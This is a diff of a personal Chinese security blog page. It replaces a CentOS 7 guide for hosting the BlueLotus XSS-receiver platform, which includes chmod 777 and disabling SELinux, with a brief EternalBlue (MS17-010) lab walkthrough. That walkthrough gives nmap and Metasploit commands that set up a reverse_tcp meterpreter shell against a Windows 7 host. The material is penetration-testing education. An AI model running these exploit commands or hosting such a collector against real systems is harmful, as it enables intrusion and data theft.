@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Centos7搭建xss平台 | 王亮亮</title>
-  <meta name="keywords" content=" 系统 ">
-  <meta name="description" content="Centos7搭建xss平台 | 王亮亮">
+  <title>永恒之蓝利用 | 王亮亮</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="永恒之蓝利用 | 王亮亮">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介 王亮亮 毕业于广州工业，目前工作信息安全方向。 喜欢研究，渗透，网络，系统，编程新技术和未来发展。 最近 在出版完整渗透测试过程教学，请大家多多支持。 联系方式 QQ：1119098304邮箱：1119098304@qq.com">
 <meta property="og:type" content="website">
@@ -463,9 +463,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Centos7搭建xss平台" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ms17_010漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Centos7搭建xss平台</h1>
+        <h1 class="article-title">永恒之蓝利用</h1>
     
     <div class="article-meta">
         
@@ -473,21 +473,21 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="运维">运维</a>
+                <a href="javascript:" data-rel="kali">kali</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">系统</a>
+            <a href="javascript:" class="color3">渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-31 22:20:15'>2019-08-25 17:29</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-07 15:17:49'>2019-09-07 15:29</time>
         
     </div>
     <div class="article-meta">
@@ -509,7 +509,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#所需环境"><span class="toc-text">所需环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装环境"><span class="toc-text">安装环境</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#永恒之蓝"><span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击利用"><span class="toc-text">攻击利用</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -524,8 +524,8 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><p>系统：centos7.x<br>Web容器：Apache<br>脚本语言：php<br>其他：GIT,iptables防火墙设置，vps（没有vps，什么都是假的）</p>
-<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>安装Apache<br>yum install httpd -y //一定要加-y，不然有可能启动不了<br>启动Apache服务<br>systemctl start httpd.service //启动服务<br>systemctl stop httpd.service //关闭服务<br>systemctl restart httpd.service //重新启动服务<br>验证Apache<br>浏览器输入自己本机ip地址或者回环地址<br>设置开机启动Apache服务（个人需求来决定）<br>systemctl enable httpd.service //开机启动<br>systemctl disable httpd.service //开机不启动<br>安装PHP<br>yum install php -y<br>安装git工具<br>yum install git -y<br>删除Apache默认界面<br>rm -rf /var/www/* (rm -rf 目录路径 Linux常用删除命令）<br>在www目录下创建网站文件夹<br>mkdir /var/www/xss (mkdir 新目录路径 linux创建新目录）<br>从Github上获取xss平台源码<br>git clone <a href="https://github.com/firesunCN/BlueLotus_XSSReceiver.git" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver.git</a> /var/www/xss/<br>获取xss平台源码的时候报错安装不了<br>查看下git版本，为1.8.x(默认yum源的版本)，故猜到为版本太低造成的问题。升级git最新版后再执行git pull<br>Sudo yum update nss curl (nss为名称解析和认证服务 curl为网络请求库）<br>赋予目录权限<br>Chmod -R 777 /var/www/xss/(chmod能改变权限 -R是目录下的所有权限，777就是最高权限）<br>配置Apache<br>新建虚拟主机的配置文件<br>mkdir /etc/httpd/conf/vhost （先新建一个文件夹）<br>touch /etc/httpd/conf/vhost/httpd-vhosts.conf (创建配置文件）<br>编辑虚拟文件<br>Vi /etc/httpd/conf/vhost/httpd-vhosts.conf<br>加入以下代码<br>&lt;VirtualHost *:80&gt;<br>DocumentRoot “/var/www/xss”<br>DirectoryIndex admin.php<br><virtualhost><br>将编辑的虚拟主机文件复制一份<br>cp /etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak<br>编辑Apache配置文件httpd.conf<br>Vi /etc/httpd/conf/httpd.conf<br>修改DocumentRoot参数<br>“/var/www/xss”<br>修改optinos<br>optinos execcgi followsysmlinks<br>修改Allowoverride<br>all<br>文件结尾加一下语句，创建虚拟主机<br>Include /etc/httpd/conf/vhost/httpd-vhosts.conf<br>检测文件是否有错误<br>httpd -t<br>假如报错，请参考上面修改看看有没有错误，无法打开网页则添加一句<br>ServerName localhost:80<br>重新加载Apache配置文件<br>Systemctl start httpd<br>命令开放80端口<br>Firewall -cmd –zone=public –add-port=80/tcp –permanent<br>重新启动防火墙<br>Systemctl restart firewalld<br>浏览器访问服务器，安装<br>修改密码，其他可以默认，也可以根据需求来改<br>解决xss数据不可写问题<br>Vi /etc/selinux/config<br>加 SELINUX=disabled<br>其他全部注释</virtualhost></p>
+        <h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>利用永恒之蓝(ms17_010)漏洞进行win7内网渗透测试获取权限</p>
+<h1 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h1><p>攻击者：kali 192.168.56.144<br>被攻击者：win7 192.168.56.133<br>nmap -sS 192.168.56.133<br>发现开放445端口对应的运行程序是microsoft-ds<br>启动msf<br>use exploit/windows/smb/ms17_010_eternalblue<br>show option<br>set rhosts 192.168.56.133<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.168.56.144<br>run</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1119098304@qq.com </span>
@@ -539,12 +539,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Centos7搭建xss平台</p>
+    <p><span class="copy-title">文章标题:</span>永恒之蓝利用</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLiangliang">WLiangliang</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-25, 17:29:32</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-31, 22:20:15</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/25/Centos7搭建xss平台/" title="Centos7搭建xss平台">http://yoursite.com/2019/08/25/Centos7搭建xss平台/</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-07, 15:29:32</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-07, 15:17:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/07/ms17_010漏洞利用/" title="永恒之蓝利用">http://yoursite.com/2019/09/07/ms17_010漏洞利用/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
